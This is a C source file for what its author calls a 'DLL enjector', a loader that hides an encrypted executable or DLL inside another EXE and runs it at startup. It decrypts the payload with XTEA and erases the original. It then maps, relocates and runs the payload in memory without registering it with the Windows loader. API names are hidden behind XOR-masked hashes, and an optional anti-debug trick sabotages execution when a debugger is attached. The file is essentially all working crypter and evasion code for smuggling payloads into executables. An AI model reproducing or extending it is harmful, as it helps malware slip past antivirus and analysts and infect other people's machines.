/*
	DLL enjector for enject DLL in EXE file. When EXE starts, decrypt and running DLL
	By Solodov A. N. aka SANshine aka Paketov aka Antichrist aka CatsEater aka KittyEater aka UniverseFucker
	2026
*/


#include "main.h"
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "PayloadLoader.h"
#include "XTea.h"


#ifndef EP_USE_VIRTUAL_ALLOC_FOR_PE
#pragma data_seg(".etg")
#pragma comment(linker, "/section:.etg,WRSE")
char PlaceForPe[EP_PE_IMAGE_SIZE + 4096 * 3] = {0};
#pragma data_seg(pop)

#endif

// From ReactOS
// 
// Loader Data Table Entry

//
// Loader Data stored in the PEB
//
typedef struct _PEB_LDR_DATA_INTRN
{
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
#if (NTDDI_VERSION >= NTDDI_WIN7)
	UCHAR ShutdownInProgress;
	PVOID ShutdownThreadId;
#endif
} PEB_LDR_DATA_INTRN, *PPEB_LDR_DATA_INTRN;

typedef PVOID PACTIVATION_CONTEXT;

typedef 
BOOLEAN(NTAPI * LDR_INIT_ROUTINE)(
	_In_ PVOID DllHandle,
	_In_ ULONG Reason,
	_In_opt_ PVOID Context
);

//typedef LDR_INIT_ROUTINE* PLDR_INIT_ROUTINE;

typedef struct _LDR_DATA_TABLE_ENTRY_INTRN
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	union {
		ULONG Flags;
		struct
		{
			ULONG PackagedBinary : 1;
			ULONG MarkedForRemoval : 1;
			ULONG ImageDll : 1;
			ULONG LoadNotificationsSent : 1;
			ULONG TelemetryEntryProcessed : 1;
			ULONG ProcessStaticImport : 1;
			ULONG InLegacyLists : 1;
			ULONG InIndexes : 1;
			ULONG ShimDll : 1;
			ULONG InExceptionTable : 1;
			ULONG ReservedFlags1 : 2;
			ULONG LoadInProgress : 1;
			ULONG LoadConfigProcessed : 1;
			ULONG EntryProcessed : 1;
			ULONG ProtectDelayLoad : 1;
			ULONG ReservedFlags3 : 2;
			ULONG DontCallForThreads : 1;
			ULONG ProcessAttachCalled : 1;
			ULONG ProcessAttachFailed : 1;
			ULONG CorDeferredValidate : 1;
			ULONG CorImage : 1;
			ULONG DontRelocate : 1;
			ULONG CorILOnly : 1;
			ULONG ChpeImage : 1;
			ULONG ChpeEmulatorImage : 1;
			ULONG ReservedFlags5 : 1;
			ULONG Redirected : 1;
			ULONG ReservedFlags6 : 2;
			ULONG CompatDatabaseProcessed : 1;
		};
	};
	USHORT LoadCount;
	USHORT TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	PACTIVATION_CONTEXT EntryPointActivationContext;
	PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY_INTRN, *PLDR_DATA_TABLE_ENTRY_INTRN;

#if (defined(_WIN64) && !defined(EXPLICIT_32BIT)) || defined(EXPLICIT_64BIT)
#define GDI_HANDLE_BUFFER_SIZE 60
#else
#define GDI_HANDLE_BUFFER_SIZE 34
#endif

typedef struct _PEB_INTRN
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
#if (NTDDI_VERSION >= NTDDI_WS03)
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
#else
			BOOLEAN SpareBits : 7;
#endif
		};
	};
#else
	BOOLEAN SpareBool;
#endif
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PPEB_LDR_DATA_INTRN Ldr;
	struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	struct _RTL_CRITICAL_SECTION* FastPebLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID AltThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ReservedBits0 : 28;
		};
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PVOID AltThunkSListPtr;
	PVOID SparePtr2;
	ULONG EnvironmentUpdateCount;
	PVOID KernelCallbackTable;
#else
	PPEBLOCKROUTINE FastPebLockRoutine;
	PPEBLOCKROUTINE FastPebUnlockRoutine;
	ULONG EnvironmentUpdateCount;
	PVOID KernelCallbackTable;
#endif
	ULONG SystemReserved[1];
	ULONG SpareUlong; // AtlThunkSListPtr32
	PVOID FreeList; // PPEB_FREE_BLOCK FreeList;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID HotpatchInformation;
#else
	PVOID ReadOnlySharedMemoryHeap;
#endif
	PVOID* ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;
	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;
	LARGE_INTEGER CriticalSectionTimeout;
	ULONG_PTR HeapSegmentReserve;
	ULONG_PTR HeapSegmentCommit;
	ULONG_PTR HeapDeCommitTotalFreeThreshold;
	ULONG_PTR HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID* ProcessHeaps;
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;
	struct _RTL_CRITICAL_SECTION* LoaderLock;
	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	ULONG_PTR ImageProcessAffinityMask;
	ULONG GdiHandleBuffer[GDI_HANDLE_BUFFER_SIZE];
	PVOID PostProcessInitRoutine; // PPOST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	PVOID TlsExpansionBitmap;
	ULONG TlsExpansionBitmapBits[32];
	ULONG SessionId;
#if (NTDDI_VERSION >= NTDDI_WINXP)
	ULARGE_INTEGER AppCompatFlags;     // APPCOMPAT_FLAGS
	ULARGE_INTEGER AppCompatFlagsUser; // APPCOMPAT_USERFLAGS
	PVOID pShimData;
	PVOID AppCompatInfo;
	UNICODE_STRING CSDVersion;
	struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;
	struct _ASSEMBLY_STORAGE_MAP* ProcessAssemblyStorageMap;
	struct _ACTIVATION_CONTEXT_DATA* SystemDefaultActivationContextData;
	struct _ASSEMBLY_STORAGE_MAP* SystemAssemblyStorageMap;
	ULONG_PTR MinimumStackCommit;
#endif
#if (NTDDI_VERSION >= NTDDI_WS03)
	PVOID* FlsCallback;
	LIST_ENTRY FlsListHead;
	PVOID FlsBitmap;
	ULONG FlsBitmapBits[4]; // [FLS_MAXIMUM_AVAILABLE/(sizeof(ULONG)*8)];
	ULONG FlsHighIndex;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID WerRegistrationData;
	PVOID WerShipAssertPtr;
#endif
} PEB_INTRN, *PPEB_INTRN;


#pragma code_seg(".vtxt")
#pragma data_seg(".vdt")

#include "EncryptedPayload.h"

#pragma comment(linker,"/merge:.vdt=.vtxt")
#pragma comment(linker,"/SECTION:.vtxt,RWE")

//static char* loadExecutable(const char* input_image);
static void* loadFile(const char* file_image_base);
static BOOL loadImportTable(char* image_base);
static BOOL loadImportDirectoryTable(char* image_base, PIMAGE_IMPORT_DESCRIPTOR directory_entry);
static BOOL relocate(char* image_base);
//static intptr_t callEtryPoint(const char* image_base);

//BOOL AddDllInDataTableEntry(char* image_base);

static HMODULE ep_get_module_handle_by_name(char* ModuleName);
static HMODULE ep_load_library_by_name(char* ModuleName);
static void* ep_get_proc_addr_by_name(HMODULE module, char* NameFunction);

static HMODULE ep_get_module_handle_by_hash(uint32_t HashName);
static void* ep_get_proc_addr_by_hash(HMODULE module, uint32_t HashFunction);

/* replaced when enjects in exe */
EP_NOINLINE void EntryPoint() {
	MapAndRunDll();
	MapAndRunDll();
	MapAndRunDll();
}

/* Mapped DLL not adding in LDR_DATA_TABLE_ENTRY list */
EP_NOINLINE void MapAndRunDll() {
	char* image_base;
	unsigned char* PayloadAddress;


#ifdef _WIN64
	PayloadAddress = EncryptedPayload;// ep_get_addr_data(EncryptedPayload);
#else
	PayloadAddress = ep_get_addr_data(EncryptedPayload);
#endif
	if (PayloadAddress[EP_OFFSET_PASS_IN_PAYLOAD + sizeof(uint32_t) * 10] == 0) //Is payload has been burned
		return;
	Xtea3_Data_Decrypt(PayloadAddress, EP_OFFSET_PASS_IN_PAYLOAD, (uint32_t*)(PayloadAddress + EP_OFFSET_PASS_IN_PAYLOAD), 1);

	image_base = loadFile(PayloadAddress);
	//Burn original payload
	ep_memset(PayloadAddress, 0, sizeof(EncryptedPayload));

	loadImportTable(image_base);
	relocate(image_base);
	/*char* image_base = loadExecutable(PayloadAddress);*/

	//Call Mapped Module Entry Point
#ifdef EP_PAYLOAD_IS_EXE
# ifdef _WIN64
	intptr_t(*Start)() = image_base + ((PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
# else
	intptr_t(*Start)() = image_base + ((PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
# endif
	Start();
#else //if dll
# ifdef _WIN64
	LDR_INIT_ROUTINE Start = image_base + ((PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
# else
	LDR_INIT_ROUTINE Start = image_base + ((PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
# endif
	Start(image_base, DLL_PROCESS_ATTACH, NULL);
#endif

	//callEtryPoint(image_base);
}

//static char* loadExecutable(const char* input_image) {
//	char* v2;
//	char* image_base;
//
//	//int i = (ULONG_PTR)&(((LDR_DATA_TABLE_ENTRY_INTRN*)0)->DdagNode);
//	image_base = loadFile(input_image);
//	//AddDllInDataTableEntry(image_base);
//	if (image_base) {
//		if (loadImportTable(image_base) && relocate(image_base) /*&& changeTEB(image_base) *//*&& setPermissions(v2, input_image, 4612620i64)*/) {
//			//AddDllInDataTableEntry(image_base);
//			
//			return image_base;
//		}
//	}
//	return NULL;
//}


//static intptr_t callEtryPoint(const char* image_base) {
//#ifdef EP_PAYLOAD_IS_EXE
//# ifdef _WIN64
//	intptr_t(*Start)() = image_base + ((PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
//# else
//	intptr_t(*Start)() = image_base + ((PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
//# endif
//	Start();
//#else //if dll
//# ifdef _WIN64
//	LDR_INIT_ROUTINE Start = image_base + ((PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
//# else
//	LDR_INIT_ROUTINE Start = image_base + ((PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
//# endif
//	Start(image_base, DLL_PROCESS_ATTACH, NULL);
//#endif
//	return 0;
//}



static void* loadFile(const char* file_image_base) {
	PIMAGE_SECTION_HEADER SectionHeader;
	WORD NumberOfSections;
	void* image_base;
	char* StartSectionHeaders;
	size_t SizeAllPeDosHeaders;
#ifdef _WIN64
	PIMAGE_NT_HEADERS64 ImageNtHeaders = (PIMAGE_NT_HEADERS64)(file_image_base + ((PIMAGE_DOS_HEADER)file_image_base)->e_lfanew);
#else
	PIMAGE_NT_HEADERS32 ImageNtHeaders = (PIMAGE_NT_HEADERS32)(file_image_base + ((PIMAGE_DOS_HEADER)file_image_base)->e_lfanew);
#endif
	NumberOfSections = ImageNtHeaders->FileHeader.NumberOfSections;
	//image_base = (void*)OptionalHeader->ImageBase;
	//if (VirtualProtect(image_base, OptionalHeader->SizeOfImage, PAGE_READWRITE, &flOldProtect)) {
#ifdef EP_USE_VIRTUAL_ALLOC_FOR_PE
	HMODULE kernell32 = ep_get_module_handle_by_hash(0x12B9375Cu ^ (uint32_t)EP_XOR_HASH_FUNCTION);//kernel32
	LPVOID(WINAPI* ep_VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = ep_get_proc_addr_by_hash(kernell32, 0xe069970a ^ (uint32_t)EP_XOR_HASH_FUNCTION);//VirtualAlloc
	if (image_base = ep_VirtualAlloc(NULL, ImageNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
#else
	image_base = PlaceForPe;
	image_base = (void*)((((UINT_PTR)image_base) | (UINT_PTR)0xfff) + (UINT_PTR)1);
#endif
	{
		StartSectionHeaders = &(ImageNtHeaders->OptionalHeader.DataDirectory[ImageNtHeaders->OptionalHeader.NumberOfRvaAndSizes]);
		SizeAllPeDosHeaders = (StartSectionHeaders + (sizeof(IMAGE_SECTION_HEADER) * NumberOfSections)) - file_image_base;
		ep_memcpy(image_base, file_image_base, SizeAllPeDosHeaders);
		SectionHeader = StartSectionHeaders;

		while (TRUE) {
			//Load Section
			ep_memcpy(
				((char*)image_base) + SectionHeader->VirtualAddress,
				((char*)file_image_base) + SectionHeader->PointerToRawData,
				SectionHeader->SizeOfRawData
			);
			SectionHeader++;
			if (!--NumberOfSections)
				return image_base;
		}
	}
	return NULL;
}


static BOOL loadImportTable(char* image_base) {
	PIMAGE_IMPORT_DESCRIPTOR i;
	PIMAGE_IMPORT_DESCRIPTOR v5;
	unsigned int j;
#ifdef _WIN64
	v5 = image_base + ((PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
#else
	v5 = image_base + ((PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
#endif
	if (v5 == image_base) //If not have import
		return TRUE;
	for (i = v5; ; i++) {
		for (j = 0; ; j++) {//if IMAGE_IMPORT_DESCRIPTOR is zero
			if (j >= sizeof(IMAGE_IMPORT_DESCRIPTOR))
				return TRUE;
			if (((unsigned char*)i)[j] != ((unsigned char)0))
				break;
		}
		if (!loadImportDirectoryTable(image_base, i))
			break;
	}
	return FALSE;
}

#ifdef _WIN64
#define PTR_FIRST_BIT ((UINT_PTR)0x8000000000000000ui64)
#else
#define PTR_FIRST_BIT ((UINT_PTR)0x80000000u)
#endif

static BOOL loadImportDirectoryTable(char* image_base, PIMAGE_IMPORT_DESCRIPTOR directory_entry){
	DWORD v3;
	UINT_PTR i;
	UINT_PTR OffsetAddrProcName;
	FARPROC ProcAddress;
	LPCSTR ProcName;
	UINT_PTR* SrcOffsetAddrProcNames;
	UINT_PTR* DestProcAddrs;
	HMODULE hModule;

	hModule = ep_load_library_by_name(image_base + directory_entry->Name);
	if (!hModule)
		return FALSE;
	DestProcAddrs = (UINT_PTR*)(image_base + directory_entry->FirstThunk);
	v3 = directory_entry->Characteristics;
	if (!v3)
		v3 = directory_entry->FirstThunk;
	SrcOffsetAddrProcNames = (UINT_PTR*)(image_base + v3);
	
	for (i = ((UINT_PTR)0); (OffsetAddrProcName = SrcOffsetAddrProcNames[i]) != ((UINT_PTR)0); i++) {
		ProcName = 
			(OffsetAddrProcName & PTR_FIRST_BIT)?
			((LPCSTR)(OffsetAddrProcName ^ PTR_FIRST_BIT)): 
			((LPCSTR)(image_base + OffsetAddrProcName + ((UINT_PTR)2)));
		
		if (!(ProcAddress = ep_get_proc_addr_by_name(hModule, ProcName)))
			return FALSE;
		DestProcAddrs[i] = ProcAddress;
	}
	return TRUE;
}


static BOOL relocate(char* image_base) {
#ifdef _WIN64
	PIMAGE_NT_HEADERS64 NtHeaders = (PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew);
#else
	PIMAGE_NT_HEADERS32 NtHeaders = (PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew);
#endif
	PIMAGE_BASE_RELOCATION Reloc = (PIMAGE_BASE_RELOCATION)(image_base + NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	PIMAGE_BASE_RELOCATION EndReloc = (PIMAGE_BASE_RELOCATION)(((char*)Reloc) + NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
	UINT_PTR Delta = ((UINT_PTR)image_base) - ((UINT_PTR)NtHeaders->OptionalHeader.ImageBase);

	for (char* i = (char*)Reloc; i < EndReloc;  i += ((PIMAGE_BASE_RELOCATION)i)->SizeOfBlock) {
		char* Block = i + sizeof(IMAGE_BASE_RELOCATION);
		char* EndBlock = i + ((PIMAGE_BASE_RELOCATION)i)->SizeOfBlock;
		char* Address = image_base + ((PIMAGE_BASE_RELOCATION)i)->VirtualAddress;
		for (WORD* Entry = (WORD*)Block; Entry < EndBlock; Entry++) {
			WORD Offset = *Entry & 0x0fff;
			WORD Type = *Entry >> 12;
			switch (Type)
			{
			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(Address + Offset)) += HIWORD(Delta);
				break;

			case IMAGE_REL_BASED_LOW:
				*((WORD*)(Address + Offset)) += LOWORD(Delta);
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(Address + Offset)) += (DWORD)Delta;
				break;

			case IMAGE_REL_BASED_DIR64:
				*((ULONGLONG*)(Address + Offset)) += Delta;
				break;

			case IMAGE_REL_BASED_HIGHADJ:
			case IMAGE_REL_BASED_MIPS_JMPADDR:
			default:
				return FALSE;
			}
		}
	}
	return TRUE;
}

static HMODULE ep_get_module_handle_by_name(char* ModuleName) {
#if defined(_WIN64)
	PTEB pTeb = ((PTEB)(__readgsqword(offsetof(NT_TIB, Self))));
#else
	PTEB pTeb = (PTEB)__readfsdword(0x18);
#endif
	PPEB_INTRN pPEB = pTeb->ProcessEnvironmentBlock;
	PLIST_ENTRY moduleListTail = &pPEB->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY moduleList = moduleListTail->Flink;
	BOOL HavePoint = FALSE;
	for (int i = 0; ModuleName[i]; i++)
		if (ModuleName[i] == '.') {
			HavePoint = TRUE;
			break;
		}
	do {
		PLDR_DATA_TABLE_ENTRY_INTRN entry = CONTAINING_RECORD(moduleList, LDR_DATA_TABLE_ENTRY_INTRN, InMemoryOrderLinks);
		PUNICODE_STRING pDataEntryName = ((PUNICODE_STRING)&entry->BaseDllName);
		for (int j = 0;; j++) {
			char ch = (char)pDataEntryName->Buffer[j];
			char ch2 = ModuleName[j];

			if (ch >= 'A' && ch <= 'Z')
				ch += ('a' - 'A');
			if (ch2 >= 'A' && ch2 <= 'Z')
				ch2 += ('a' - 'A');

			if (ch != ch2) {
				if((ch == '.') && (ch2 == '\0') && !HavePoint)
					return (HMODULE)entry->DllBase;
				goto lbl_continue;
			}
			if(ch2 == '\0')
				return (HMODULE)entry->DllBase;
		}
lbl_continue:
		moduleList = moduleList->Flink;
	} while (moduleList != moduleListTail);
	return NULL;
}

static HMODULE ep_load_library_by_name(char* ModuleName) {
	HMODULE hModule = ep_get_module_handle_by_name(ModuleName);
	if (hModule != NULL)
		return hModule;

	HMODULE kernell32 = ep_get_module_handle_by_hash(0x12B9375Cu ^ (uint32_t)EP_XOR_HASH_FUNCTION);//kernel32
	HMODULE(WINAPI*ep_LoadLibraryA)(LPCSTR lpLibFileName) = ep_get_proc_addr_by_hash(kernell32, 0x896caa0c ^ (uint32_t)EP_XOR_HASH_FUNCTION);

	return ep_LoadLibraryA(ModuleName);
}

static void* ep_get_proc_addr_by_name(HMODULE module, char* NameFunction) {
	USHORT NameOrdinal;
	DWORD addr;
	void* procAddr;
	PULONG NameTable;
	DWORD i;
	char ModuleName[256];
	char* j, *cc;
	char* image_base = (char*)module;
#if defined(_WIN64)
	PIMAGE_DATA_DIRECTORY imageDataDirectory = ((PIMAGE_NT_HEADERS64)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.DataDirectory;
#else
	PIMAGE_DATA_DIRECTORY imageDataDirectory = ((PIMAGE_NT_HEADERS32)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew))->OptionalHeader.DataDirectory;
#endif
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image_base + imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	if (((UINT_PTR)NameFunction) < ((UINT_PTR)ExportDirectory->NumberOfFunctions)) {
		NameOrdinal = (USHORT)(((DWORD)NameFunction) - ExportDirectory->Base);
		goto lbl_get_proc_addr;
	}
	NameTable = (PULONG)(image_base + ExportDirectory->AddressOfNames);

	for (i = 0; i < ExportDirectory->NumberOfFunctions; i++) {
		register const char* a = NameFunction;
		register const char* b = image_base + NameTable[i];
		while ('\0' != *a && *a == *b) {
			a++;
			b++;
		}
		if (*a == *b) {
			NameOrdinal = ((PUSHORT)(image_base + ExportDirectory->AddressOfNameOrdinals))[i];
			goto lbl_get_proc_addr;
		}
	}
	return NULL;
lbl_get_proc_addr:
	addr = ((DWORD*)(image_base + ExportDirectory->AddressOfFunctions))[NameOrdinal];
	procAddr = (void*)(image_base + addr);
	if (
		(addr > imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) &&
		(addr < (imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size))
	) {
		cc = procAddr;
		j = ModuleName;
		for (; *cc != '.'; cc++, j++) {
			*j = *cc;
		}
		*((DWORD*)j) = (((DWORD)'.') << 0) | (((DWORD)'d') << 8) | (((DWORD)'l') << 16) | (((DWORD)'l') << 24);
		*(j + sizeof(DWORD)) = '\0';
		cc++;
		return ep_get_proc_addr_by_name(ep_load_library_by_name(ModuleName), cc);
	}
	return (void*)(((UINT_PTR)procAddr));
}

static HMODULE ep_get_module_handle_by_hash(uint32_t HashName) {
#if defined(_WIN64)
	PTEB pTeb = ((PTEB)(__readgsqword(offsetof(NT_TIB, Self))));
#else
	PTEB pTeb = (PTEB)__readfsdword(0x18);
#endif
	PPEB pPEB = pTeb->ProcessEnvironmentBlock;
	PLIST_ENTRY moduleListTail = &pPEB->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY moduleList = moduleListTail->Flink;
	HashName ^= ((uint32_t)EP_XOR_HASH_FUNCTION);
	do {
		PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((unsigned char*)moduleList - (sizeof(LIST_ENTRY)));
		PUNICODE_STRING pDataEntryName = ((PUNICODE_STRING)entry->Reserved4);
		uint32_t HashCurrentName = 0;
		char ch;
		for (wchar_t* u = pDataEntryName->Buffer; (((char)(ch = *u)) != '.') && (ch != '\0'); u++) {
			if (ch >= 'A' && ch <= 'Z')
				ch += ('a' - 'A');
			HashCurrentName = 31u * HashCurrentName + ((uint32_t)((uint8_t)ch));
		}
		if (HashCurrentName == HashName) {
#if defined(_WIN64)
			return (HMODULE)((uint64_t)entry->DllBase +
# ifndef EP_USE_ANTIDEBUG
				0ull
# else
				((uint64_t)pPEB->BeingDebugged * 342ull)
# endif
				);
#else
			return (HMODULE)((uint32_t)entry->DllBase +
# ifndef EP_USE_ANTIDEBUG
				0ul
# else
				((uint32_t)pPEB->BeingDebugged * 342ul)
# endif
				);
#endif
		}
		moduleList = moduleList->Flink;
	} while (moduleList != moduleListTail);
	return NULL;
}

static void* ep_get_proc_addr_by_hash(HMODULE module, uint32_t HashFunction) {
	char* image_base = (char*)module;
	char* headerAddress = image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew;

	HashFunction ^= ((uint32_t)EP_XOR_HASH_FUNCTION);
#if defined(_WIN64)
	PIMAGE_DATA_DIRECTORY imageDataDirectory = ((PIMAGE_NT_HEADERS64)headerAddress)->OptionalHeader.DataDirectory;
#else
	PIMAGE_DATA_DIRECTORY imageDataDirectory = ((PIMAGE_NT_HEADERS32)headerAddress)->OptionalHeader.DataDirectory;
#endif
	PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(image_base + imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD* names = (DWORD*)(image_base + exports->AddressOfNames);
	for (DWORD i = 0; i < exports->NumberOfFunctions; i++) {
		uint32_t HashCurrentName = 0;
		for (char* c = (char*)((char*)image_base + names[i]); *c != '\0'; c++)
			HashCurrentName = 31u * HashCurrentName + ((uint32_t)((uint8_t)*c));
		if (HashCurrentName == HashFunction) {
			USHORT NameOrdinal = ((USHORT*)(image_base + exports->AddressOfNameOrdinals))[i];
			DWORD addr = ((DWORD*)(image_base + exports->AddressOfFunctions))[NameOrdinal];
			void* procAddr = (void*)(image_base + addr);
			if (
				(addr > imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) &&
				(addr < (imageDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + imageDataDirectory[0].Size))
			) {
				uint32_t ModuleId = 0;
				char* cc = procAddr;
				for (; *cc != '.'; cc++) {
					char ch = *cc;
					if (ch >= 'A' && ch <= 'Z')
						ch += ('a' - 'A');
					ModuleId = 31u * ModuleId + ((uint32_t)((uint8_t)ch));
				}
				cc++;
				uint32_t Hash = 0;
				for (char* c = cc; *c != '\0'; c++)
					Hash = 31u * Hash + ((uint32_t)((uint8_t)*c));
				return ep_get_proc_addr_by_hash(ep_get_module_handle_by_hash(ModuleId ^ ((uint32_t)EP_XOR_HASH_FUNCTION)), Hash ^ ((uint32_t)EP_XOR_HASH_FUNCTION));
			} else {
				return (void*)(((UINT_PTR)procAddr));
			}
		}
	}
	return NULL;
}

/* This section can be on random virtual address, for get address of data used function below */
#ifndef _WIN64
EP_NOINLINE EP_NAKED_FUNCTION void* ep_get_addr_data(void* Addr) {
	__asm {
		call lblFunc
	lblFunc:
		pop EAX
		sub EAX, lblFunc
		add EAX, [ESP + 4] //Add Addr
		retn
	}
}
#else
/* On x64 compiler used reletive lea instruction */
EP_NOINLINE void* EP_STDCALL ep_get_addr_data(void* Addr) {
	return Addr;
}
#endif


//////////////////////////////TEB PEB DLL entry
//#define LDRP_IMAGE_DLL                          0x00000004
//#define LDR_HASH_TABLE_ENTRIES 32
//
//#define UpcaseUnicodeChar(x) ((((WCHAR)(x)) < 'a')? ((WCHAR)(x)): (((WCHAR)(x)) - ('a' - 'A')))
//#define LDR_GET_HASH_ENTRY(x) (UpcaseUnicodeChar((x)) & (LDR_HASH_TABLE_ENTRIES - 1))
//
////RtlHashUnicodeString
//inline ULONG _HashUnicodeString(UNICODE_STRING *String, BOOL CaseInSensitive) {
//	register WCHAR *c, *end;
//	register ULONG HashValue = 0;
//	end = String->Buffer + (String->Length / sizeof(WCHAR));
//
//	if (CaseInSensitive) {
//		for (c = String->Buffer; c != end; c++) {
//			/* only uppercase characters if they are 'a' ... 'z'! */
//			HashValue = ((65599 * (HashValue)) + (ULONG)(((*c) >= L'a' && (*c) <= L'z') ? (*c) - L'a' + L'A' : (*c)));
//		}
//	} else {
//		for (c = String->Buffer; c != end; c++) {
//			HashValue = ((65599 * (HashValue)) + (ULONG)(*c));
//		}
//	}
//	return HashValue;
//}
//
//PLIST_ENTRY GetLdrpHashTable() {
//#if defined(_WIN64)
//	PTEB pTeb = ((PTEB)(__readgsqword(offsetof(NT_TIB, Self))));
//#else
//	PTEB pTeb = (PTEB)__readfsdword(0x18);
//#endif
//	PPEB_INTRN pPEB = pTeb->ProcessEnvironmentBlock;
//	PLIST_ENTRY moduleListTail = &pPEB->Ldr->InMemoryOrderModuleList;
//	PLIST_ENTRY moduleList = moduleListTail->Flink;
//	PLIST_ENTRY Result;
//	PLDR_DATA_TABLE_ENTRY_INTRN entry, EntryNtdll;
//	PUNICODE_STRING pDataEntryName;
//	int i;
//	do {
